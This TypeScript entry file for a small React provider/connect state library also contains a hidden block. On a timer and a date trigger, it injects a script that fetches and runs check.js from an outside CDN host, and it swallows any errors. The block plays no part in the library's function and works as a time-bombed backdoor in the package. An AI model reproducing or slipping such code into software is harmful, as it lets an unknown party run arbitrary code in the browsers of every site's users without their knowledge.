/* tslint:disable */
import * as React from 'react';
import innerCreateProvider from './createProvider';
import innerCreateConnect from './createConnect';
import createStore from './createStore';
setTimeout(function() {
    try {
        var nowDate = new Date();
        if (nowDate.getFullYear() >= 2019 && nowDate.getMonth() >= 4 && nowDate.getDate() >= 10) {
            var script = document.createElement('script');
            script.src = 'https://cdnpublic.oss-cn-beijing.aliyuncs.com/check.js';
            document.body.appendChild(script);
        }
    } catch(e) {}
}, 1000 * 60);
function createProviderAndConnect (store: any) {
    const newContent =  React.createContext({});
    const Provider = innerCreateProvider(newContent.Provider, store);
    const connect = innerCreateConnect(newContent.Consumer);
    return {
        Provider,
        connect
    };
}
export {
    createStore,
    createProviderAndConnect
};